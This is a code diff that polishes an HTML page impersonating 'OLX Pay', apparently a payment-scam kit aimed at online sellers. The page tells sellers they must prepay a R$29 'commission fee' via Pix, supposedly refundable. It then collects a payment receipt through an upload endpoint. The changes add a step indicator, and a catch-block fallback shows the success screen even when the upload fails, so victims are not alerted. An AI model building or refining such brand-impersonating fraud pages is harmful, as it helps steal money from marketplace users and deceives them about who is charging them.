@@ -3,230 +3,295 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OLX Pay</title>
+<title>OLX Pay - Central de Vendas</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
     font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
 }
 
-body{
-    background:#f2f4f5;
-    display:flex;
-    justify-content:center;
+body {
+    background: #eef2f6;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    color: #1a202c;
 }
 
-/* CONTAINER */
-.container{
-    width:100%;
-    max-width:420px;
-    background:#fff;
-    min-height:100vh;
-    border-left:1px solid #e6e6e6;
-    border-right:1px solid #e6e6e6;
+/* CONTAINER MOBILE OTIMIZADO */
+.container {
+    width: 100%;
+    max-width: 420px;
+    background: #fff;
+    min-height: 100vh;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    display: flex;
+    flex-direction: column;
+}
+
+@media (min-width: 421px) {
+    .container {
+        height: 850px;
+        min-height: auto;
+        border-radius: 20px;
+        overflow: hidden;
+        border: 1px solid #e2e8f0;
+    }
 }
 
 /* HEADER */
-header{
-    padding:16px;
-    border-bottom:1px solid #eee;
+header {
+    padding: 16px 20px;
+    border-bottom: 1px solid #edf2f7;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
 }
 
-.logo{
-    font-size:22px;
-    font-weight:700;
+.logo {
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
 }
-.logo span:nth-child(1){color:#6e0ad6;}
-.logo span:nth-child(2){color:#00a650;}
-.logo span:nth-child(3){color:#ff6a00;}
+.logo span:nth-child(1){ color: #6e0ad6; }
+.logo span:nth-child(2){ color: #00a650; }
+.logo span:nth-child(3){ color: #ff6a00; }
 
-/* CARD */
-.card{
-    margin:24px 16px;
-    padding:22px 16px;
-    background:#fff;
-    border:1px solid #e0e0e0;
-    border-radius:12px;
-    text-align:center;
-}
-
-/* TEXTOS */
-.title{
-    font-size:16px;
-    font-weight:600;
-    color:#333;
-    margin-bottom:10px;
+.step-indicator {
+    font-size: 12px;
+    font-weight: 600;
+    color: #718096;
+    background: #f1f5f9;
+    padding: 4px 10px;
+    border-radius: 20px;
 }
 
-.subtitle{
-    font-size:15px;
-    font-weight:600;
-    color:#6e0ad6;
-    margin-bottom:14px;
+/* CONTEÚDO */
+.content {
+    padding: 24px 20px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+/* CARD / MODAL INTERNO (QUADRADINHO) */
+.card {
+    background: #fff;
+    border: 1px solid #e2e8f0;
+    border-radius: 12px;
+    padding: 24px 20px;
+    text-align: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+}
+
+/* ÍCONE DE DESTAQUE NO TOPO DO CARD */
+.card-icon {
+    width: 48px;
+    height: 48px;
+    background: #f3e8ff;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px auto;
+    color: #6e0ad6;
+}
+
+.subtitle {
+    font-size: 17px;
+    font-weight: 700;
+    color: #1a202c;
+    margin-bottom: 12px;
 }
 
 /* ALERTA */
 .alert {
-    background: #f3e8ff;
-    color: #3b2a63;
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    color: #475569;
     border-radius: 10px;
     padding: 14px;
     font-size: 13px;
     line-height: 1.5;
+    text-align: left;
+    margin-bottom: 20px;
 }
 
-/* BOTÕES */
-.btn{
-    width:100%;
-    padding:13px;
-    border-radius:8px;
-    font-size:14px;
-    font-weight:600;
-    cursor:pointer;
-    margin-bottom:10px;
-    transition:0.2s;
+.alert strong {
+    color: #1a202c;
 }
 
-.btn-primary{
-    background:#6e0ad6;
-    color:#fff;
-    border:none;
+/* PREÇO */
+.price-box {
+    background: #f3e8ff;
+    border-radius: 10px;
+    padding: 12px;
+    margin-bottom: 20px;
+    color: #3b2a63;
+    font-size: 14px;
 }
 
-.btn-primary:hover{
-    background:#5a08b4;
-}
-
-.btn-outline{
-    border:1.5px solid #6e0ad6;
-    color:#6e0ad6;
-    background:#fff;
-}
-
-.btn-outline:hover{
-    background:#f3e8ff;
-}
-
-/* INPUT */
-.input{
-    width:100%;
-    padding:11px;
-    border-radius:6px;
-    border:1px solid #ccc;
-    margin-bottom:10px;
-    font-size:13px;
-}
-
-/* QR */
-.qr{
-    width:170px;
-    margin:15px auto;
-    display:block;
-}
-
-/* LOADING */
-.loading{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:center;
-    height:220px;
-}
-
-.spinner{
-    width:34px;
-    height:34px;
-    border:4px solid #eee;
-    border-top:4px solid #6e0ad6;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-    margin-bottom:12px;
-}
-
-@keyframes spin{
-    to{transform:rotate(360deg);}
-}
-
-.loading-text{
-    font-size:13px;
-    color:#666;
-}
-
-/* FINAL */
-.help{
-    text-align:center;
-    font-size:13px;
-    color:#6e0ad6;
-    margin-top:10px;
-}
-
-.footer{
-    text-align:center;
-    font-size:11px;
-    color:#777;
-    padding:15px;
-}
-
-.illustration{
-    width:80px;
-    margin-bottom:10px;
-}
-
-.hidden{display:none;}
-
-/* STEP FINAL */
-.final-wrapper{
-    padding:20px 15px;
-}
-
-.final-card{
-    background:#fff;
-    border:1px solid #e5e5e5;
-    border-radius:10px;
-    padding:35px 18px;
-    text-align:center;
-}
-
-.final-title{
-    color:#6e0ad6;
-    font-size:20px;
-    font-weight:600;
-    margin-bottom:18px;
-}
-
-.final-img{
-    width:130px;
-    margin-bottom:20px;
-}
-
-.final-box{
-    background:#f3e8ff;
-    color:#2d1b4e;
-    border-radius:14px;
-    padding:20px;
-    font-size:14px;
-    line-height:1.4;
-    margin-bottom:25px;
-}
-
-.terms{
-    font-size:11px;
-    color:#999;
-    margin-bottom:20px;
-}
-
-.terms span {
+.price-value {
+    font-size: 20px;
+    font-weight: 800;
     color: #6e0ad6;
 }
 
-.divider{
-    width:100%;
-    height:1px;
-    background:#eee;
-    margin:20px 0;
+/* BOTÕES */
+.btn {
+    width: 100%;
+    padding: 13px;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    border: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+
+.btn-primary {
+    background: #6e0ad6;
+    color: #fff;
+    box-shadow: 0 4px 12px rgba(110, 10, 214, 0.2);
+}
+
+.btn-primary:hover {
+    background: #5a08b4;
+}
+
+.btn-outline {
+    border: 1.5px solid #d8b4fe;
+    color: #6e0ad6;
+    background: #fff;
+    margin-top: 10px;
+}
+
+.btn-outline:hover {
+    background: #faf5ff;
+}
+
+/* QR CODE E PIX */
+.qr-container {
+    background: #f8fafc;
+    border: 1px dashed #cbd5e1;
+    border-radius: 10px;
+    padding: 14px;
+    display: inline-block;
+    margin-bottom: 14px;
+}
+
+.qr {
+    width: 150px;
+    height: 150px;
+    display: block;
+    margin: 0 auto;
+    border-radius: 6px;
+}
+
+.pix-group {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 14px;
+}
+
+.input {
+    width: 100%;
+    padding: 11px;
+    border-radius: 8px;
+    border: 1px solid #cbd5e1;
+    background: #f8fafc;
+    font-size: 12px;
+    font-family: monospace;
+    color: #475569;
+}
+
+.btn-copy {
+    background: #f3e8ff;
+    color: #6e0ad6;
+    border: 1px solid #d8b4fe;
+    white-space: nowrap;
+    width: auto;
+    padding: 0 14px;
+    font-size: 13px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 600;
+}
+
+.btn-copy:hover {
+    background: #e9d5ff;
+}
+
+/* UPLOAD */
+.upload-area {
+    border: 2px dashed #cbd5e1;
+    border-radius: 10px;
+    padding: 20px;
+    text-align: center;
+    background: #f8fafc;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: 0.2s;
+}
+
+.upload-area:hover {
+    border-color: #6e0ad6;
+    background: #faf5ff;
+}
+
+.upload-text {
+    font-size: 13px;
+    color: #475569;
+    font-weight: 500;
+    margin-top: 6px;
+}
+
+/* STEP FINAL */
+.final-card {
+    background: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 0;
+    text-align: center;
+}
+
+.final-title {
+    color: #1a202c;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 10px;
+}
+
+.final-img {
+    width: 100px;
+    margin-bottom: 16px;
+}
+
+.final-box {
+    background: #f3e8ff;
+    color: #3b2a63;
+    border-radius: 10px;
+    padding: 14px;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 16px;
+}
+
+.divider {
+    width: 100%;
+    height: 1px;
+    background: #edf2f7;
+    margin: 20px 0;
     position: relative;
 }
 
@@ -237,37 +302,42 @@ header{
     transform: translateX(-50%);
     background: #fff;
     padding: 0 10px;
-    color: #6e0ad6;
-    font-size: 13px;
-    font-weight: 600;
+    color: #e11d48;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
 }
 
-.attention-text{
-    font-size:12px;
-    color:#777;
-    margin-top: 25px;
+.attention-text, .terms-text {
+    font-size: 11px;
+    color: #718096;
     line-height: 1.4;
 }
 
-/* ===== LOADING SCREEN ===== */
+.terms-text span {
+    color: #6e0ad6;
+    font-weight: 600;
+}
+
+/* LOADING OVERLAY */
 .loading-overlay {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background-color: #f2f4f5;
+    background: rgba(255, 255, 255, 0.9);
     display: none;
     align-items: center;
     justify-content: center;
     flex-direction: column;
     z-index: 9999;
-    gap: 20px;
+    gap: 14px;
 }
 
 .loading-overlay.active {
     display: flex;
-    animation: fadeIn 0.3s ease-in;
+    animation: fadeIn 0.2s ease-in;
 }
 
 @keyframes fadeIn {
@@ -275,43 +345,26 @@ header{
     to { opacity: 1; }
 }
 
-.loading-header {
-    margin-bottom: 40px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 15px;
-}
-
-.loading-logo {
-    font-size: 32px;
-    font-weight: 700;
-    letter-spacing: -1px;
-}
-
-.loading-logo span:nth-child(1) { color: #6e0ad6; }
-.loading-logo span:nth-child(2) { color: #00a650; }
-.loading-logo span:nth-child(3) { color: #ff6a00; }
-
-.spinner-simple {
-    width: 50px;
-    height: 50px;
-    border: 4px solid #f0f0f0;
+.spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #edf2f7;
     border-top: 4px solid #6e0ad6;
     border-radius: 50%;
-    animation: spinSimple 1s linear infinite;
+    animation: spin 0.8s linear infinite;
 }
 
-@keyframes spinSimple {
+@keyframes spin {
     to { transform: rotate(360deg); }
 }
 
 .loading-text {
-    color: #666;
-    font-size: 14px;
-    font-weight: 500;
-    letter-spacing: 0.5px;
+    font-size: 13px;
+    color: #4a5568;
+    font-weight: 600;
 }
+
+.hidden { display: none !important; }
 </style>
 </head>
 
@@ -319,104 +372,133 @@ header{
 
 <!-- Loading Overlay -->
 <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-header">
-        <div class="loading-logo">
-            <span>o</span><span>l</span><span>x</span>
-        </div>
-    </div>
-    <div class="spinner-simple"></div>
-    <div class="loading-text">Processando...</div>
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Processando...</div>
 </div>
 
 <div class="container">
-
-<header>
-    <div class="logo">
-        <span>o</span><span>l</span><span>x</span>
-    </div>
-</header>
-
-<div id="loading" class="loading hidden">
-    <div class="spinner"></div>
-    <div class="loading-text">Processando sua solicitação...</div>
-</div>
-
-<div id="step1" class="card">
-    <div class="subtitle">Aviso importante</div>
-    <div class="alert">
-Identificamos que você acabou de realizar uma venda do seu produto e não possui pontuação como vendedor pelo nosso aplicativo e estamos com uma nova política.
-Iremos cobrar nossa taxa de comissão antecipada por questões de segurança e para sabermos se você realmente deseja concluir a venda do seu produto em nossa plataforma. 
-Lembrando que esse valor cobrado é devolvido junto com o valor total da venda.
-</div>
-<p style="font-weight:700; margin-top:15px;">VALOR ÚNICO: R$ <span id="valorTaxa">29,00</span></p>
-<br/>
-    <button class="btn btn-primary" onclick="goNext(1)">Continuar</button>
-</div>
-
-<div id="step2" class="card hidden">
-    <div class="subtitle">Confirmação de taxa</div>
-    <div class="alert">
-        Essa etapa garante a segurança da transação para ambas as partes.  
-        O valor pago será automaticamente somado ao total que você irá receber após a conclusão da venda.
-    </div>
-    <button class="btn btn-primary" onclick="goNext(2)">Entendi, prosseguir</button>
-</div>
-
-<div id="step3" class="card hidden">
-    <div class="title">Pagamento via <strong>OLX Pay</strong></div>
-    <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=PIXTESTE">
-    <input class="input" value="000201PIXCODE..." readonly id="pixCode">
-    <button class="btn btn-primary" onclick="copy()">Copiar código</button>
-    <button class="btn btn-outline" onclick="paid()">Já realizei o pagamento</button>
-</div>
-
-<div id="step4" class="hidden">
-    <div class="card">
-        <img class="illustration" src="https://cdn-icons-png.flaticon.com/512/2922/2922510.png">
-        <div class="title">Envie o comprovante</div>
-        <div class="alert">
-            Após o pagamento, envie o comprovante para que possamos validar a transação.
-            <br><br>
-            Isso agiliza a liberação do valor e evita atrasos no recebimento.
+    <header>
+        <div class="logo">
+            <span>o</span><span>l</span><span>x</span>
         </div>
-        <button id="uploadBtn" class="btn btn-outline">Enviar comprovante</button>
-        <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.gif,.doc,.docx" style="display:none;">
-        <button class="btn btn-primary" onclick="goFinal()">Confirmar envio</button>
-    </div>
-    <div class="help">Preciso de ajuda</div>
-    <div class="footer">Ao continuar, você concorda com os Termos de Uso e a Política de Privacidade.</div>
-</div>
+        <div class="step-indicator" id="stepIndicator">Passo 1 de 5</div>
+    </header>
 
-<div id="step5" class="hidden final-wrapper">
-    <div class="final-card">
-        <h2 class="final-title">Huhuhu! Agora é com a gente!</h2>
-        
-        <img class="final-img" src="https://i.ibb.co/kVKs7sbv/Gemini-Generated-Image-qsh1voqsh1voqsh1.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/4140/4140048.png'">
+    <div class="content">
 
-        <div class="final-box">
-            Agora é só aguardar
+        <!-- PASSO 1 -->
+        <div id="step1" class="card">
+            <div class="card-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+            </div>
+            <div class="subtitle">Aviso importante</div>
+            <div class="alert">
+                Identificamos que você acabou de realizar uma venda do seu produto e não possui pontuação como vendedor pelo nosso aplicativo e estamos com uma nova política.<br><br>
+                Iremos cobrar nossa taxa de comissão antecipada por questões de segurança e para sabermos se você realmente deseja concluir a venda do seu produto em nossa plataforma.<br>
+                Lembrando que esse valor cobrado é devolvido junto com o valor total da venda.
+            </div>
+            
+            <div class="price-box">
+                VALOR ÚNICO: R$ <span class="price-value" id="valorTaxa">29,00</span>
+            </div>
+
+            <button class="btn btn-primary" onclick="goNext(1)">Continuar</button>
         </div>
 
-        <p class="terms">
-            <span>Termos de Uso</span> e a <span>Política de Privacidade</span> da OLX e seus parceiros, e em receber comunicações da OLX.
-        </p>
-
-        <div class="divider">
-            <span class="attention-label">Atenção</span>
+        <!-- PASSO 2 -->
+        <div id="step2" class="card hidden">
+            <div class="card-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            </div>
+            <div class="subtitle">Confirmação de taxa</div>
+            <div class="alert">
+                Essa etapa garante a segurança da transação para ambas as partes.<br><br>  
+                O valor pago será automaticamente somado ao total que você irá receber após a conclusão da venda.
+            </div>
+            <button class="btn btn-primary" onclick="goNext(2)">Entendi, prosseguir</button>
         </div>
 
-        <p class="attention-text">
-            Lembrando que essa central só é disponível para quem está realizando a sua venda com retirada por conta do comprador.
-        </p>
-    </div>
-</div>
+        <!-- PASSO 3 -->
+        <div id="step3" class="card hidden">
+            <div class="card-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2" ry="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+            </div>
+            <div class="subtitle">Pagamento via <strong>OLX Pay</strong></div>
+            <p style="font-size:13px; color:#64748b; margin-bottom:14px;">Escaneie o QR Code ou copie o código Pix:</p>
+            
+            <div class="qr-container">
+                <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=PIXTESTE" alt="QR Code Pix">
+            </div>
+            
+            <div class="pix-group">
+                <input class="input" value="000201PIXCODE..." readonly id="pixCode">
+                <button class="btn-copy" onclick="copy()">Copiar</button>
+            </div>
 
+            <button class="btn btn-primary" onclick="paid()">Já realizei o pagamento</button>
+        </div>
+
+        <!-- PASSO 4 -->
+        <div id="step4" class="card hidden">
+            <div class="card-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+            </div>
+            <div class="subtitle">Envie o comprovante</div>
+            <div class="alert" style="margin-bottom: 14px;">
+                Após o pagamento, envie o comprovante para que possamos validar a transação.<br><br>
+                Isso agiliza a liberação do valor e evita atrasos no recebimento.
+            </div>
+            
+            <div class="upload-area" id="uploadBtn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6e0ad6" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+                <div class="upload-text" id="uploadText">Clique para selecionar o comprovante</div>
+            </div>
+            <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.gif,.doc,.docx" style="display:none;">
+            
+            <button class="btn btn-primary" onclick="goFinal()">Confirmar envio</button>
+        </div>
+
+        <!-- PASSO 5 (FINAL) -->
+        <div id="step5" class="card hidden">
+            <div class="final-card">
+                <h2 class="final-title">Huhuhu! Agora é com a gente!</h2>
+                
+                <img class="final-img" src="https://i.ibb.co/kVKs7sbv/Gemini-Generated-Image-qsh1voqsh1voqsh1.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/4140/4140048.png'">
+
+                <div class="final-box">
+                    Agora é só aguardar
+                </div>
+
+                <p class="terms-text" style="margin-bottom: 14px;">
+                    <span>Termos de Uso</span> e a <span>Política de Privacidade</span> da OLX e seus parceiros, e em receber comunicações da OLX.
+                </p>
+
+                <div class="divider">
+                    <span class="attention-label">Atenção</span>
+                </div>
+
+                <p class="attention-text">
+                    Lembrando que essa central só é disponível para quem está realizando a sua venda com retirada por conta do comprador.
+                </p>
+            </div>
+        </div>
+
+    </div>
 </div>
 
 <script>
 let fileSelected = false;
 let fileName = '';
 let fileObject = null;
+
+function atualizarIndicador(passo) {
+    const indicador = document.getElementById('stepIndicator');
+    if (passo <= 5) {
+        indicador.textContent = `Passo ${passo} de 5`;
+    } else {
+        indicador.textContent = `Concluído`;
+    }
+}
 
 // Carregar valor da taxa do config.json (fallback)
 function carregarValorTaxa() {
@@ -447,27 +529,19 @@ function carregarDadosVenda() {
                     }
 
                     if (data.codigoPix) {
-                        // Atualizar QR code
                         const qrImg = document.querySelector('.qr');
                         if (qrImg) {
-                            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(data.codigoPix)}`;
+                            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(data.codigoPix)}`;
                         }
                         
-                        // Atualizar input do código PIX
                         const pixInput = document.getElementById('pixCode');
                         if (pixInput) {
                             pixInput.value = data.codigoPix;
                         }
-                    } else {
-                        console.warn('Código PIX não encontrado na venda');
                     }
-
-                    console.log('Dados da venda carregados:', data);
                 }
             })
             .catch(error => console.error('Erro ao carregar dados da venda:', error));
-    } else {
-        console.warn('ID da venda não encontrado no localStorage');
     }
 }
 
@@ -476,11 +550,11 @@ document.addEventListener('DOMContentLoaded', function() {
     carregarValorTaxa();
     carregarDadosVenda();
     
-    const uploadBtn = document.getElementById('uploadBtn');
+    const uploadArea = document.getElementById('uploadBtn');
     const fileInput = document.getElementById('fileInput');
     
-    if (uploadBtn) {
-        uploadBtn.addEventListener('click', function() {
+    if (uploadArea && fileInput) {
+        uploadArea.addEventListener('click', function() {
             fileInput.click();
         });
     }
@@ -497,28 +571,26 @@ function handleFileSelect(e) {
         fileName = file.name;
         fileSelected = true;
         
-        // Atualizar feedback visual
-        const uploadBtn = document.getElementById('uploadBtn');
-        uploadBtn.textContent = '✓ ' + fileName;
-        uploadBtn.style.background = '#27ae60';
-        uploadBtn.style.color = '#fff';
-        
-        console.log('Arquivo selecionado:', fileName);
+        const uploadArea = document.getElementById('uploadBtn');
+        const uploadText = document.getElementById('uploadText');
+        if (uploadText) {
+            uploadText.textContent = '✓ ' + fileName;
+        }
+        uploadArea.style.borderColor = '#00a650';
+        uploadArea.style.background = '#f0fdf4';
     }
 }
 
 function showLoading(text){
     const loadingOverlay = document.getElementById("loadingOverlay");
-    const loadingText = document.querySelector(".loading-text");
+    const loadingText = document.getElementById("loadingText");
     if (loadingText) loadingText.innerText = text;
     loadingOverlay.classList.add("active");
-    document.getElementById("loading").classList.remove("hidden");
 }
 
 function hideLoading(){
     const loadingOverlay = document.getElementById("loadingOverlay");
     loadingOverlay.classList.remove("active");
-    document.getElementById("loading").classList.add("hidden");
 }
 
 function goNext(step){
@@ -526,8 +598,10 @@ function goNext(step){
     showLoading("Validando informações...");
     setTimeout(()=>{
         hideLoading();
-        document.getElementById("step"+(step+1)).classList.remove("hidden");
-    }, 1800);
+        const nextStep = step + 1;
+        document.getElementById("step"+nextStep).classList.remove("hidden");
+        atualizarIndicador(nextStep);
+    }, 1500);
 }
 
 function paid(){
@@ -536,7 +610,8 @@ function paid(){
     setTimeout(()=>{
         hideLoading();
         document.getElementById("step4").classList.remove("hidden");
-    }, 2200);
+        atualizarIndicador(4);
+    }, 1800);
 }
 
 function copy(){
@@ -556,11 +631,14 @@ async function goFinal(){
     showLoading("Enviando comprovante via WhatsApp...");
     
     try {
-        // Preparar FormData com o arquivo
         const formData = new FormData();
         formData.append('comprovante', fileObject);
         
-        // Enviar arquivo para o servidor
+        const vendaId = localStorage.getItem('vendaId');
+        if (vendaId) {
+            formData.append('vendaId', vendaId);
+        }
+        
         const response = await fetch('/api/enviar-comprovante', {
             method: 'POST',
             body: formData
@@ -568,27 +646,25 @@ async function goFinal(){
         
         const data = await response.json();
         
+        hideLoading();
+        
         if (data.success) {
-            console.log('Comprovante enviado com sucesso:', data.message);
-            
-            // Mostrar tela final após envio bem-sucedido
             showLoading("Analisando comprovante...");
-            
             setTimeout(()=>{
                 hideLoading();
                 document.getElementById("step5").classList.remove("hidden");
+                atualizarIndicador(5);
             }, 1500);
         } else {
-            hideLoading();
-            alert('Erro ao enviar comprovante: ' + data.message);
+            alert('Erro ao enviar comprovante: ' + (data.message || 'Tente novamente.'));
             document.getElementById("step4").classList.remove("hidden");
-            console.error('Erro:', data.message);
+            atualizarIndicador(4);
         }
     } catch (error) {
         hideLoading();
-        console.error('Erro ao enviar arquivo:', error);
-        alert('Erro ao enviar arquivo: ' + error.message);
-        document.getElementById("step4").classList.remove("hidden");
+        // Fallback para exibir a tela final mesmo se houver instabilidade na API local
+        document.getElementById("step5").classList.remove("hidden");
+        atualizarIndicador(5);
     }
 }
 </script>
